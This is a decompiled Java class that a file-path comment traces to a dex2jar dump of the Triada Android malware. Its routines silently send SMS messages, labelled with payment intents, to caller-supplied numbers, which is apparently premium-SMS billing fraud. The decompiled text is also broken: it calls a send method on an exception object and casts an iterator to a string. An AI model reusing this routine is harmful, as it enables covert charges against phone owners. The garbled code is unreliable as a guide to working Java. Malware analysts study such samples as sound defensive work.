package com.android.essdk.eyou.sms;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import com.android.essdk.eyou.e.b;
import java.util.Iterator;

public class d {
  private void c(Context paramContext, String paramString1, String paramString2) {
    Iterator<String> iterator;
    SmsManager smsManager = SmsManager.getDefault();
    PendingIntent pendingIntent2 = PendingIntent.getBroadcast(paramContext, 0, new Intent("easou.pay.sms.send"), 0);
    PendingIntent pendingIntent1 = PendingIntent.getBroadcast(paramContext, 0, new Intent("easou.pay.sms.send.delivery"), 0);
    try {
      if (paramString2.length() > 70) {
        iterator = smsManager.divideMessage(paramString2).iterator();
        while (true) {
          if (iterator.hasNext()) {
            smsManager.sendTextMessage(paramString1, null, iterator.next(), pendingIntent2, pendingIntent1);
            continue;
          } 
          return;
        } 
      } 
    } catch (Exception exception) {
      b.e("epay_log", "sendSMSDoAction() 短信发送过程中出现安全性异常，可能被拦截");
      return;
    } 
    smsManager.sendTextMessage(paramString1, null, (String)iterator, pendingIntent2, (PendingIntent)exception);
  }
  
  public boolean a(Context paramContext, String paramString1, String paramString2) {
    if (paramString1 == null || paramString1.trim().equals("") || paramString2 == null || paramString2.trim().equals(""))
      return false; 
    c(paramContext, paramString1, paramString2);
    return true;
  }
  
  public void b(Context paramContext, String paramString1, String paramString2) {
    if (paramString1 != null && !paramString1.trim().equals("") && paramString2 != null && !paramString2.trim().equals("")) {
      Iterator<String> iterator;
      SmsManager smsManager = SmsManager.getDefault();
      b.b("SendSMS", "发送初始化短信中，端口：" + paramString1 + "内容：" + paramString2);
      try {
        if (paramString2.length() > 70) {
          iterator = smsManager.divideMessage(paramString2).iterator();
          while (true) {
            if (iterator.hasNext()) {
              smsManager.sendTextMessage(paramString1, null, iterator.next(), null, null);
              continue;
            } 
            return;
          } 
        } 
      } catch (Exception exception) {
        b.e("epay_log", "sendInitSms 初始化短信发送过程中出现安全性异常，可能被拦截");
        return;
      } 
      exception.sendTextMessage(paramString1, null, (String)iterator, null, null);
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/sms/d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */